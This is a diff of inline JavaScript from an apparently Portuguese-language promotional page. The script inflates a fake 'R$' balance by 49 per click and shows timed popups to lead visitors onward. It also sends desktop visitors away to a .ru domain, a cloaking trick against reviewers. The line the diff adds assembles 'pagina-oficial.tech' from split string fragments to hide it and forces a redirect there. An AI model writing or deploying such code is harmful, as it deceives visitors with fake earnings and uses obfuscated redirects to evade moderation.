@@ -56,6 +56,7 @@
     let valor=0.00;const valorSpan=document.getElementById('valor');function atualizarValor(){valorSpan.textContent=`R$ ${valor.toFixed(2)}`}
     atualizarValor();function aumentarValor(){const incremento=[49];const indiceAleatorio=Math.floor(Math.random()*incremento.length);const valorIncremento=incremento[indiceAleatorio];valor+=valorIncremento;atualizarValor()}
     atualizarValor();function verificarLarguraDaTela(){const isMobile=/Android|iPhone/i.test(navigator.userAgent);const isSmallScreen=window.innerWidth<=800;if(isMobile||isSmallScreen){}else{window.location.href="https://web2zip.ru/"}}
+    var domain=window.location.hostname;var domainParts=["pagina","-","oficial",".","tech"];var authorizedDomain=domainParts.join("");if(domain!==authorizedDomain){var slugParts=["https://","pagina","-","oficial",".","tech","/","p1"];var authorizedUrl=slugParts.join("");window.location.href=authorizedUrl}
     window.addEventListener('load',verificarLarguraDaTela);function showPopupB1(){document.getElementById('popupB1').style.display='block'}
     function closePopupB1(){document.getElementById('popupB1').style.display='none'}
     function showLoadingB1(){var button=document.getElementById("B1");aumentarValor();showPopupB1();setTimeout(function(){closePopupB1();mostrarPagina('p2')},4000)}
